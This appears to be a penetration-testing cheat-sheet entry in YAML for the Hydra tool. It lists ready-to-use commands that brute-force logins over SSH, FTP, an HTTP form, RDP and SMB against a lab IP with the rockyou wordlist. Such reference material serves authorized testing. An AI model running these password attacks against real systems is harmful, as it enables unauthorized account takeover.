---
description: |
  Online brute-force tool for various protocols — SSH, FTP, HTTP,
  SMB, RDP, and more.

  Reference values:
    Target IP: 10.10.10.1
    Username: pentuser
command: |
  # SSH brute force
  hydra -l pentuser -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1

  # FTP brute force
  hydra -l pentuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.1

  # HTTP POST form
  hydra -l pentuser -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

  # RDP brute force
  hydra -l pentuser -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.1

  # SMB brute force
  hydra -l pentuser -P /usr/share/wordlists/rockyou.txt smb://10.10.10.1
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - SSH
  - FTP
  - HTTP
  - SMB
  - RDP
items:
  - Username
techniques:
  - Password_Spraying
network_position:
  - External
  - Internal
references:
  - https://github.com/vanhauser-thc/thc-hydra
---
